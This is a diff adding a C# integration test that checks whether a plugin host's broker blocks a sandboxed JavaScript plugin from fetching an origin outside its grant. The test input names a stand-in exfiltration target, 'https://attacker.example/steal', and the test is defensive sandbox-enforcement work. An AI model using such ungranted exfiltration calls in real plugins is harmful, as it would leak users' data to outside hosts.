@@ -310,4 +310,36 @@ public class PluginHostIntegrationTests
         }
         finally { session.Dispose(); }
     }
+
+    /// <summary>
+    /// X07 against the production channel: a plugin runs real JS that tries to reach an origin outside
+    /// its per-call grant through the host-proxied $http op (native/quickjs-bridge bridge.c). The
+    /// production Broker (Susu.Plugins/Broker.cs), not a direct-API check inside the plugin, must
+    /// refuse it (TEST-PLAN X07 explicitly disallows substituting a direct-API-level denial for this).
+    /// BrokerTests.cs already proves this at the C#-envelope level; this proves the same denial holds
+    /// end to end through the real AppContainer + QuickJS engine + IPC channel.
+    /// </summary>
+    [Fact]
+    public async Task A_malicious_plugin_is_denied_by_the_host_broker_for_an_ungranted_origin()
+    {
+        string? staged = StageHost();
+        if (staged is null) return;
+        string host = Path.Combine(staged, "susu.exe");
+
+        using var session = HostSession.Start(new HostSession.Options(host, staged, "quickjs", KeepProfile: false));
+        try
+        {
+            Assert.True(session.Load("echo", "plugins/echo").Ok);
+            // Grant only allows https://allowed.example; the plugin asks for a different origin.
+            var (_, _, task) = session.Invoke("echo", "maliciousFetch", "{\"url\":\"https://attacker.example/steal\"}", jobId: "job-x07",
+                origins: ["https://allowed.example"]);
+            var envelope = await task.WaitAsync(TimeSpan.FromSeconds(5), TestContext.Current.CancellationToken);
+            Assert.Equal(Susu.Contracts.IpcMessageType.Completed, envelope.Type); // the plugin call itself completes...
+            var completed = envelope.Payload!.Value.Deserialize(Susu.Contracts.ContractsJson.Default.CompletedPayload)!;
+            // ...but the nested $http op inside it was refused by the host broker, not answered.
+            Assert.True(completed.Result!.Value.GetProperty("denied").GetBoolean());
+            Assert.Contains("not granted", completed.Result.Value.GetProperty("error").GetString());
+        }
+        finally { session.Shutdown(2000); }
+    }
 }
